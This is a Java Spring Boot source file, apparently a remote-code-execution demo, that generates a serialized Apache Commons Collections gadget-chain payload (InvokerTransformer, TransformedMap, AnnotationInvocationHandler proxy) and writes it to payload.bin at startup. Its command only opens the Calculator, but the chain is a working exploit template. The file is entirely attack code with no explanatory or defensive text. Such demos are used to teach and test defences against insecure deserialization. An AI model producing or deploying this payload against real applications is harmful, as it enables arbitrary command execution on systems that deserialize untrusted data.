package com.segwarez.rcedemo;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class RCEDemoApplication {
    public static void main(String[] args) throws Exception {
        generatePayload();
        SpringApplication.run(RCEDemoApplication.class, args);
    }

    private static void generatePayload() throws Exception {
        InvokerTransformer transformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"open -a Calculator"}
        );

        var innerMap = new HashMap<>();
        innerMap.put("value", "exploit");
        var outerMap = TransformedMap.decorate(innerMap, null, transformer);

        var clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        var ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        var handler = (InvocationHandler) ctor.newInstance(Override.class, outerMap);

        var proxy = Proxy.newProxyInstance(RCEDemoApplication.class.getClassLoader(),
                new Class[]{Map.class}, handler);

        try (var objectOutputStream = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            objectOutputStream.writeObject(proxy);
        }
    }
}
